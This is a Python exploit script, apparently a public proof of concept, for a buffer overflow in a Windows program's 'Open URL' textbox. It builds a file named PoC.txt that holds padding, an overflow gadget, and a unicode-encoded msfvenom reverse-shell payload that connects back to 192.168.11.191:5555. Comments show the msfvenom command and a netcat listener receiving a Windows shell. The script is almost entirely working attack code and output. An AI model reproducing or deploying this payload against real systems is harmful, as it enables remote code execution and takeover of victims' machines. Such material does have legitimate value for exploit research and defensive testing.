#!/usr/bin/env python
#copy the Content into URL TEXTBOX (FILE > OPEN URL ...)
# Tested on Window 7 Professional SP1 
import struct

#004800B3  |. 59             POP ECX
#004800B4  |. 5D             POP EBP
#004800B5  \. C3             RETN

#0018F76D   05 000A0011      ADD EAX,11000A00
#0018F772   2D 00010011      SUB EAX,11000100

#\x00\x0A\x0D badchar 

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.191] from (UNKNOWN) [192.168.11.190] 49317
#Microsoft Windows [Version 6.1.7601]
#Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
#
#C:\Users\User\Desktop>
#


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.191 lport=5555 -e  x86/unicode_upper  BufferRegister=EAX
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/unicode_upper
#x86/unicode_upper succeeded with size 779 (iteration=0)
#x86/unicode_upper chosen with final size 779
#Payload size: 779 bytes
#PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKL9XTBKPKPM0QPCYZE01WPQTTK20NP4KPRLL4KQBLTDKD2MXLO7GOZO6NQKOFLOL31CLKRNLMPGQXOLMM1Y7IRZRR2PWTKPRLPDK0JOL4KPLN13HZCOXKQZ1B14KB9O0KQHS4KPIN8ZCNZ194KP4TKKQZ6P1KOVL7QHOLMM1XG08K0D5ZVLCSMKHOKCMO4T5YT28TK28MTKQJ31VDKLL0KTK28MLM1ICTKKTTKM1J0DI0DO4ND1K1K31B9PZ0QKO9P1O1O0ZTKLRJK4M1MC8P3OBKPKP38BW43021OPTC80LBWMVKWKO9E6XDPM1KPKPO97TB420BHMYE0BKM0KOHUPPB020PPOP0POP201X9ZLO9O9PKOHUV7QZM5BH7PFHLK7OS8LBM0MEFS3YJFQZN0R6QGRHUIG5BT1QKOZ5SUI0RTLLKOPNM8SEJLRHL0X56BB6KOIE2HBCRM2DM0SYZC1GQGR7P1L61ZMBPY0V9RKMBF8G0DNDOLKQM14M14NDLP7VM0Q40TR026B6260FPVPNB61FQC1F2H3I8LOOE6KOZ559YP0N260FKO001XLH3WMM1PKOJ5GKJPWEW2PVQXUVDU7MEMKO9EOLKVCLKZU0KK9PBUM5GKOWLS3BRO2JM01CKOXUAA

payload="PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKL9XTBKPKPM0QPCYZE01WPQTTK20NP4KPRLL4KQBLTDKD2MXLO7GOZO6NQKOFLOL31CLKRNLMPGQXOLMM1Y7IRZRR2PWTKPRLPDK0JOL4KPLN13HZCOXKQZ1B14KB9O0KQHS4KPIN8ZCNZ194KP4TKKQZ6P1KOVL7QHOLMM1XG08K0D5ZVLCSMKHOKCMO4T5YT28TK28MTKQJ31VDKLL0KTK28MLM1ICTKKTTKM1J0DI0DO4ND1K1K31B9PZ0QKO9P1O1O0ZTKLRJK4M1MC8P3OBKPKP38BW43021OPTC80LBWMVKWKO9E6XDPM1KPKPO97TB420BHMYE0BKM0KOHUPPB020PPOP0POP201X9ZLO9O9PKOHUV7QZM5BH7PFHLK7OS8LBM0MEFS3YJFQZN0R6QGRHUIG5BT1QKOZ5SUI0RTLLKOPNM8SEJLRHL0X56BB6KOIE2HBCRM2DM0SYZC1GQGR7P1L61ZMBPY0V9RKMBF8G0DNDOLKQM14M14NDLP7VM0Q40TR026B6260FPVPNB61FQC1F2H3I8LOOE6KOZ559YP0N260FKO001XLH3WMM1PKOJ5GKJPWEW2PVQXUVDU7MEMKO9EOLKVCLKZU0KK9PBUM5GKOWLS3BRO2JM01CKOXUAA"
payload ="A"*123 + payload + "B"*(1019-123-len(payload)) + "\x61\x62"  + "\xB3\x48"+ "\x42\x54\x42\x58\x42\x05\x0B\x11\x42\x2D\x02\x11\x42\x50\x42\xc3" + "B" * 4600
try:
	f=open("PoC.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(payload)
	f.write(payload)
	f.close()
	print "[+] File created!"
except:
	print "File cannot be created"
